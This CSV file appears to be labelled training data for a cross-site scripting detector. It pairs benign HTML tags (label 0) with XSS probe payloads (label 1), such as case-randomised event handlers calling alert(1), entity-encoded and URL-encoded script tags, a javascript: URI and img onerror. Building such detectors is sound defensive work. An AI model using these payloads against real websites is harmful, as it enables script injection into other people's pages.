payload,label
<svg ONFocus=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<a onlOAd=alert(1)>,1
<svg OncLick=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div attr=value>,0
<test onFOcuS=alert(1)>,1
<test attr=value>,0
<img oNFOcus=alert(1)>,1
<svg OnClIck=alert(1)>,1
<a OnloAD=alert(1)>,1
<a attr=value>,0
%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E,1
<img attr=value>,0
<div ONlOad=alert(1)>,1
<svg OnmOUseover=alert(1)>,1
<test OnLoAD=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg onlOaD=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<test attr=value>,0
<img OnloAd=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<img onmoUSEoVEr=alert(1)>,1
<div attr=value>,0
<div OnFocuS=alert(1)>,1
<div attr=value>,0
<svg onCLiCk=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<img attr=value>,0
<test ONFOCus=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<test onfOCUS=alert(1)>,1
<a OnCLick=alert(1)>,1
<a OnfoCuS=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<a ONcliCK=alert(1)>,1
<img onCLiCk=alert(1)>,1
<a onclICK=alert(1)>,1
<a OnmoUSEoVER=alert(1)>,1
<div attr=value>,0
<svg onfOcuS=alert(1)>,1
<div attr=value>,0
<svg OncliCk=alert(1)>,1
<svg OnLOAD=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<img attr=value>,0
<a attr=value>,0
<img attr=value>,0
<a OnFocUs=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<img attr=value>,0
<img attr=value>,0
<div attr=value>,0
<div onLOAd=alert(1)>,1
<a ONclICK=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<test attr=value>,0
<test OnLoaD=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<a ONfoCuS=alert(1)>,1
<a oNclICk=alert(1)>,1
<img attr=value>,0
<a oNMouSEOVer=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<test OnlOAd=alert(1)>,1
<a oNLOad=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<div OnLOad=alert(1)>,1
<svg oncLick=alert(1)>,1
<a onLoaD=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<div oNclICk=alert(1)>,1
<test ONclIcK=alert(1)>,1
<img attr=value>,0
<test OnloAd=alert(1)>,1
<svg attr=value>,0
<a onloAD=alert(1)>,1
<img ONmoUSEoVeR=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<div OnMOUsEovER=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<a oNFocUs=alert(1)>,1
<img attr=value>,0
<svg oNClICK=alert(1)>,1
<test oNCliCK=alert(1)>,1
<img ONload=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<a attr=value>,0
<a ONFOCUs=alert(1)>,1
<a onload=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<img OnfocUs=alert(1)>,1
<test OnCLICk=alert(1)>,1
<a ONmousEovEr=alert(1)>,1
<a ONfOCUs=alert(1)>,1
<svg ONcLick=alert(1)>,1
<a attr=value>,0
<&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;>&#x61;&#x6c;&#x65;&#x72;&#x74;(&#x31;)</&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;>,1
<a onMouSeoVEr=alert(1)>,1
<div attr=value>,0
<div oncLICK=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img attr=value>,0
<div attr=value>,0
<test ONFOcUs=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a attr=value>,0
<div ONfoCUs=alert(1)>,1
<test OnClICk=alert(1)>,1
<div oNcLiCK=alert(1)>,1
<img attr=value>,0
<img onMousEovER=alert(1)>,1
<div OnFocUs=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<div Onload=alert(1)>,1
<img OnloAD=alert(1)>,1
<img oNClicK=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<test oNclicK=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<img attr=value>,0
<img ONfOCUS=alert(1)>,1
<img oNMOUseOVEr=alert(1)>,1
<test OnfOCUS=alert(1)>,1
<test oncLIcK=alert(1)>,1
<div oNMOUSEOvEr=alert(1)>,1
<test attr=value>,0
<a OnmOuSEOvER=alert(1)>,1
<a ONfocUS=alert(1)>,1
<svg onMOusEOVER=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<a ONClIcK=alert(1)>,1
<div oNCLICK=alert(1)>,1
<div ONfOCUs=alert(1)>,1
<test onlOad=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<div attr=value>,0
<img oNLoAd=alert(1)>,1
<div oNMOUsEOVEr=alert(1)>,1
<svg attr=value>,0
<test oNcLiCk=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<div ONloAd=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<test oNloaD=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<a ONlOad=alert(1)>,1
<img attr=value>,0
<a OnCLiCK=alert(1)>,1
<a attr=value>,0
<div oNCLICk=alert(1)>,1
<test oNClicK=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<svg ONclick=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<test attr=value>,0
<img ONloAD=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<svg ONFOcuS=alert(1)>,1
<div oncLicK=alert(1)>,1
<a attr=value>,0
<svg oNclIcK=alert(1)>,1
<div attr=value>,0
<img ONcLICk=alert(1)>,1
<a ONFOcus=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<div OnfOCus=alert(1)>,1
<div attr=value>,0
<img onfOcUS=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<div onMoUSEovEr=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<img ONLoAd=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<test OncliCK=alert(1)>,1
<img attr=value>,0
<div oNCLiCk=alert(1)>,1
<a attr=value>,0
<svg OnmouseOVER=alert(1)>,1
<div oNcLiCK=alert(1)>,1
<div ONMoUsEOVEr=alert(1)>,1
<test attr=value>,0
<<div>>Hello<</div>>,0
<svg attr=value>,0
<test oNClICK=alert(1)>,1
<img OnLoad=alert(1)>,1
<a ONClICk=alert(1)>,1
<a oNCLiCk=alert(1)>,1
<img ONloAD=alert(1)>,1
<test attr=value>,0
<svg OnmOusEOvEr=alert(1)>,1
<svg attr=value>,0
<a ONlOaD=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<div oNfocuS=alert(1)>,1
<a ONloAD=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<img oNClICK=alert(1)>,1
<img attr=value>,0
<div OnMouseOVER=alert(1)>,1
<svg onLOaD=alert(1)>,1
<a ONFOCUS=alert(1)>,1
<svg attr=value>,0
<div oNLOaD=alert(1)>,1
<svg ONmOuSEOveR=alert(1)>,1
<a attr=value>,0
<svg OnFocuS=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div ONmOusEoVeR=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<img oNmOuSEoveR=alert(1)>,1
<svg OnCLICk=alert(1)>,1
<svg onlOAd=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<img attr=value>,0
<test onCLick=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg ONClick=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<img OnFocuS=alert(1)>,1
<div OnLOAd=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<div OnClICK=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<a OncLIcK=alert(1)>,1
<img OnfOcuS=alert(1)>,1
<a attr=value>,0
<img onfocus=alert(1)>,1
<div onMouSeoveR=alert(1)>,1
<img oncLIck=alert(1)>,1
<a OnLoAD=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<img attr=value>,0
<img onlOAd=alert(1)>,1
<div attr=value>,0
<test onFoCUS=alert(1)>,1
<div ONfOCUs=alert(1)>,1
<a onFoCUS=alert(1)>,1
<a ONmOuseoVER=alert(1)>,1
<div attr=value>,0
<img OnmOUsEOver=alert(1)>,1
<test onMoUsEOVER=alert(1)>,1
<a attr=value>,0
<test onCLIck=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<div onfOCUs=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<test OncliCk=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<a ONloaD=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<a onClick=alert(1)>,1
<test ONloaD=alert(1)>,1
<a OnloaD=alert(1)>,1
<test attr=value>,0
<svg onLOAd=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<img attr=value>,0
<div oNfOcus=alert(1)>,1
<svg oNLoAd=alert(1)>,1
<a onCLiCk=alert(1)>,1
<test OnfocUS=alert(1)>,1
<test OnmoUSEovEr=alert(1)>,1
<img oNmOuSeovER=alert(1)>,1
<img oNLOAd=alert(1)>,1
<a oNmOuSeoVeR=alert(1)>,1
<img oNmoUSeovEr=alert(1)>,1
<img oNLoaD=alert(1)>,1
<test ONClicK=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<test OnFOCuS=alert(1)>,1
<img attr=value>,0
<svg OnclIck=alert(1)>,1
<div Onload=alert(1)>,1
<div onFOCus=alert(1)>,1
<svg attr=value>,0
<img OnFocus=alert(1)>,1
<test oNMousEOVER=alert(1)>,1
<a oNloaD=alert(1)>,1
<svg OnMouseOver=alert(1)>,1
<div attr=value>,0
<img ONMoUsEOVer=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<img oncLICK=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<test onloAD=alert(1)>,1
<test attr=value>,0
<div onCLICK=alert(1)>,1
<svg attr=value>,0
<svg OnLOAd=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a oNMOUSEovEr=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<div attr=value>,0
<test attr=value>,0
<a attr=value>,0
<a attr=value>,0
<div oNload=alert(1)>,1
<test attr=value>,0
<div oNcLick=alert(1)>,1
<img oNClICk=alert(1)>,1
<a OnclIcK=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<div attr=value>,0
<a onFocUs=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<a attr=value>,0
<a oNFOcus=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<a onMOUSEOvER=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<svg ONcLICK=alert(1)>,1
<svg ONMOUSeovER=alert(1)>,1
<a ONFocus=alert(1)>,1
<svg oNfocuS=alert(1)>,1
<img OnMOUSEOveR=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<div attr=value>,0
<a ONclick=alert(1)>,1
<div oNLOAD=alert(1)>,1
<test ONCLicK=alert(1)>,1
javascript:alert(1),1
<svg attr=value>,0
<div attr=value>,0
<div oncLIcK=alert(1)>,1
<svg onFocus=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<svg oNLoad=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<div attr=value>,0
<img onFoCUs=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<test OnLOaD=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img oNloAd=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<img ONcLiCK=alert(1)>,1
<div OnloaD=alert(1)>,1
<a oncLicK=alert(1)>,1
<img attr=value>,0
<test ONLoAD=alert(1)>,1
<test attr=value>,0
<&#x73;&#x76;&#x67; &#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;=&#x61;&#x6c;&#x65;&#x72;&#x74;(&#x31;)>,1
<svg attr=value>,0
<div attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<img OncliCK=alert(1)>,1
<svg oNmOUSeOVeR=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<div OnfOcUS=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<a attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<div attr=value>,0
<test ONfOcUS=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<a attr=value>,0
<div attr=value>,0
<a attr=value>,0
<svg oNlOad=alert(1)>,1
<test ONmoUsEOVER=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<img attr=value>,0
<svg ONcLICk=alert(1)>,1
<a attr=value>,0
<img oncLIck=alert(1)>,1
<svg onmOUseoVer=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<a OnfOcus=alert(1)>,1
<test attr=value>,0
<test onfocUS=alert(1)>,1
<div onclick=alert(1)>,1
<test OnFoCuS=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<img oNFOCuS=alert(1)>,1
<a oNcLiCK=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<test attr=value>,0
<test attr=value>,0
<svg OnLOAD=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<a OnMouseoVer=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<img attr=value>,0
<test attr=value>,0
<svg OnCLiCk=alert(1)>,1
<test attr=value>,0
<div oNloaD=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<test OnmouSEoVEr=alert(1)>,1
<test attr=value>,0
<a OnClicK=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a attr=value>,0
<div attr=value>,0
<test OnloAD=alert(1)>,1
<svg attr=value>,0
<test onClick=alert(1)>,1
<img oNmOUSEOVEr=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<img ONFocus=alert(1)>,1
<a attr=value>,0
<svg ONLOAD=alert(1)>,1
<svg attr=value>,0
<a oNloaD=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<a oNFoCuS=alert(1)>,1
<a attr=value>,0
<svg onCliCk=alert(1)>,1
<test attr=value>,0
<svg OnFoCUS=alert(1)>,1
<test ONclICK=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<div oNCLICK=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<test OnClick=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<div oNClICK=alert(1)>,1
<div attr=value>,0
<svg oNCLICk=alert(1)>,1
<a onfoCus=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<a attr=value>,0
<svg OnMOuSeOVeR=alert(1)>,1
<svg ONlOad=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<svg OnMoUSeoVeR=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<img onFOCus=alert(1)>,1
<div OncLIck=alert(1)>,1
<a ONLOad=alert(1)>,1
<test ONFOCuS=alert(1)>,1
<img attr=value>,0
<img onclICK=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<div oNMOUsEOvEr=alert(1)>,1
<a attr=value>,0
<div onfoCUs=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img ONFoCUS=alert(1)>,1
<test attr=value>,0
<test onload=alert(1)>,1
<div oNClIck=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<svg oNFOCus=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<div oNMOUsEovEr=alert(1)>,1
<img oNmousEoVer=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<a oNcLicK=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<svg OnFOcuS=alert(1)>,1
<img ONfOcUs=alert(1)>,1
<a attr=value>,0
<test ONfOcUS=alert(1)>,1
<img oNLOad=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<svg OnlOAd=alert(1)>,1
<div OnfoCUS=alert(1)>,1
<a oNfOCUS=alert(1)>,1
<img OncLiCK=alert(1)>,1
<svg attr=value>,0
<svg ONfOcus=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<test attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div attr=value>,0
<a attr=value>,0
<div attr=value>,0
<img attr=value>,0
<svg oNmousEOVER=alert(1)>,1
<a attr=value>,0
<svg ONLOaD=alert(1)>,1
<img oNClick=alert(1)>,1
<test ONFOCuS=alert(1)>,1
<test onClIcK=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<div attr=value>,0
<img onlOad=alert(1)>,1
<test OnCLick=alert(1)>,1
<div onMouSeovEr=alert(1)>,1
<img attr=value>,0
<a ONCliCK=alert(1)>,1
<img attr=value>,0
<div ONMoUSeoVer=alert(1)>,1
<img attr=value>,0
<a ONclIck=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<div ONmOUSeovEr=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img oNLoaD=alert(1)>,1
<test onfOcUS=alert(1)>,1
<img attr=value>,0
<div onMOUsEOver=alert(1)>,1
<div attr=value>,0
<img OnfocuS=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a onFOcUs=alert(1)>,1
<img OnmOuseovEr=alert(1)>,1
<test oNMOUSeovEr=alert(1)>,1
<svg attr=value>,0
<test onlOaD=alert(1)>,1
<div ONLOAD=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<a ONLOAd=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a ONmOusEovER=alert(1)>,1
<img oNLoaD=alert(1)>,1
<img oncLicK=alert(1)>,1
<test ONclIcK=alert(1)>,1
<a attr=value>,0
<test ONLoaD=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<div ONloAD=alert(1)>,1
<a OnLoAD=alert(1)>,1
<svg oNLoad=alert(1)>,1
<div ONMOuseOVEr=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div onclICK=alert(1)>,1
<test oNFOCuS=alert(1)>,1
<svg attr=value>,0
<div ONclICk=alert(1)>,1
<div OnfoCuS=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div onClICK=alert(1)>,1
<test ONMouSeoveR=alert(1)>,1
<img OnfoCus=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<div onCLiCK=alert(1)>,1
<svg attr=value>,0
<div ONMOUSEOVEr=alert(1)>,1
<test attr=value>,0
<a ONMOuSeOver=alert(1)>,1
<a ONmoUseOveR=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<svg ONMoUsEOVer=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<img OnmouSeOVEr=alert(1)>,1
<test attr=value>,0
<svg ONCLIck=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<svg onLOAD=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<div attr=value>,0
<img attr=value>,0
<img attr=value>,0
<test ONClIck=alert(1)>,1
<div oNLOaD=alert(1)>,1
<test oNfoCus=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<img ONFOCUS=alert(1)>,1
<div oncLicK=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<img OnfOCus=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a oNMouseoVER=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<test attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<test OnFocUS=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<test attr=value>,0
<test onMOUsEover=alert(1)>,1
<svg attr=value>,0
<a onmOUSEOveR=alert(1)>,1
<a oNcLICk=alert(1)>,1
<svg attr=value>,0
<div onlOAd=alert(1)>,1
<div attr=value>,0
<a oNcLIck=alert(1)>,1
<test attr=value>,0
<svg ONload=alert(1)>,1
<img ONLoaD=alert(1)>,1
<test attr=value>,0
<img OnclIck=alert(1)>,1
<div attr=value>,0
<svg OnclICk=alert(1)>,1
<img ONMouSeoVER=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<svg onmoUsEOvEr=alert(1)>,1
<img attr=value>,0
<a oNlOAD=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<div oNcLICK=alert(1)>,1
<svg attr=value>,0
<test oNMOUSeoveR=alert(1)>,1
<div attr=value>,0
<test onLOAD=alert(1)>,1
<div oNmoUSEover=alert(1)>,1
<div onLoAd=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<a OnfocuS=alert(1)>,1
<test attr=value>,0
<svg OnCLIck=alert(1)>,1
<img oNlOaD=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<img attr=value>,0
<div ONclICk=alert(1)>,1
<test oNcLiCK=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<a onMoUSEoVEr=alert(1)>,1
<svg oNcLick=alert(1)>,1
<test OnfOcus=alert(1)>,1
<test attr=value>,0
<test oNMOuSEOVeR=alert(1)>,1
<test attr=value>,0
<div ONMousEoVEr=alert(1)>,1
<svg ONMOuSeOVER=alert(1)>,1
<img attr=value>,0
<svg onloAD=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div attr=value>,0
<a attr=value>,0
<svg ONmOUseOVer=alert(1)>,1
<a OnmouSEOVEr=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<a oNmouSeovER=alert(1)>,1
<img OnClIck=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<img oNCLICk=alert(1)>,1
<div oNClICk=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<a attr=value>,0
<a attr=value>,0
<img oNclIcK=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<a attr=value>,0
<img attr=value>,0
<a OncLICK=alert(1)>,1
<svg attr=value>,0
<svg ONLoAD=alert(1)>,1
<a OnLoaD=alert(1)>,1
<a attr=value>,0
<img onLOaD=alert(1)>,1
<a attr=value>,0
<a ONMOUsEOVEr=alert(1)>,1
<img oNcliCK=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<div onLOAd=alert(1)>,1
<img oNcLICK=alert(1)>,1
<svg attr=value>,0
<test OnfOCUS=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<a OnMoUseoVER=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a attr=value>,0
<a attr=value>,0
<img onfOCUs=alert(1)>,1
<a oNfOcUS=alert(1)>,1
<svg onfoCus=alert(1)>,1
<a oNmOuseoVEr=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<div attr=value>,0
<div attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<img ONmOuseOVer=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<img attr=value>,0
<test attr=value>,0
<img ONcLick=alert(1)>,1
<svg onloAD=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<test onlOAd=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<a onLOad=alert(1)>,1
<a attr=value>,0
<svg ONfocUs=alert(1)>,1
<a onfoCuS=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<a attr=value>,0
<svg onmouSEoVeR=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<div oNMOUsEovER=alert(1)>,1
<test attr=value>,0
<tEST OnlOAD=X>,0
<svg attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<img attr=value>,0
<test attr=value>,0
<svg OnfOCuS=alert(1)>,1
<img OnfoCUS=alert(1)>,1
<a attr=value>,0
<a OnFocuS=alert(1)>,1
<div attr=value>,0
<svg ONloAD=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<iMg SRC=X ONerROR=ALert(1)>,1
<a attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<svg OnmOuSEoveR=alert(1)>,1
<img attr=value>,0
<a oNmOUSEOver=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<test onCliCk=alert(1)>,1
<svg attr=value>,0
<svg OnCLIck=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<img OnFocus=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<div onmOUSEoVER=alert(1)>,1
<img ONCLIck=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<img attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div ONfoCUs=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<svg oNfocUs=alert(1)>,1
<a attr=value>,0
<img OnLOaD=alert(1)>,1
<test OnfoCUs=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<img ONLoAD=alert(1)>,1
<img src=x onerror=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<img attr=value>,0
<<svg onload=alert(1)>>,1
<test onmouSEOVeR=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<img attr=value>,0
<a oncLICK=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<img attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<img ONCliCK=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<img attr=value>,0
<div attr=value>,0
<img attr=value>,0
<test ONLOaD=alert(1)>,1
<div attr=value>,0
<svg onMOuSEOvER=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<a attr=value>,0
<div attr=value>,0
